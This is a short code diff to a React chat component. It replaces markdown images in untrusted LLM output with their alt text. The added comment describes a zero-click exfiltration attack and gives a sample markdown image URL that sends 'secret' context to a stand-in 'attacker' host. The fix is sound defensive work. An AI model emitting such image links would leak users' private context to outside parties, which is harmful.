@@ -294,6 +294,13 @@ export function GeneralChatArea({ logs, status, requiredAction, onOpenSettings, 
                                                                                 {children}
                                                                             </code>
                                                                         )
+                                                                    },
+                                                                    img({ alt }: any) {
+                                                                        // The chat content is UNTRUSTED LLM output. Do NOT auto-load images: the
+                                                                        // fetch itself is a zero-click exfiltration beacon (the LLM can put context
+                                                                        // in the URL, e.g. ![](https://attacker/p?ctx=secret), and the browser sends
+                                                                        // it). Show the alt text instead of rendering an <img> (deep-hunt).
+                                                                        return <span className="text-zinc-400 dark:text-zinc-500 italic">[image omitted: {alt || 'untitled'}]</span>
                                                                     }
                                                                 }}
                                                             >
